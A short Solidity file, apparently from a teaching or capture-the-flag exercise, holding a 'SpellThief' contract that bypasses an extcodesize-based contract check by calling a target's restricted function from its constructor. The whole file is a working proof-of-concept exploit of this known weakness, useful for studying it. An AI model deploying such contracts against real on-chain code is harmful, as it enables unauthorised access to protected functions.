// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IEnchantedLibrary {
    function hasMagicalAura(address being) external view returns (bool);
    function accessForbiddenSpell() external;
}

/**
 * @title SpellThief
 * @dev This contract demonstrates the exploit by disguising the thief's aura during the creation of the contract.
 */
contract SpellThief {
    bool public magicalAura;
    address public thiefAddress;

    // During contract creation, the magical aura (extcodesize) is 0, allowing bypassing the magical aura check.
    constructor(address _enchantedLibrary) {
        magicalAura = IEnchantedLibrary(_enchantedLibrary).hasMagicalAura(address(this));
        thiefAddress = address(this);
        // Successfully access the forbidden spell.
        IEnchantedLibrary(_enchantedLibrary).accessForbiddenSpell();
    }
}
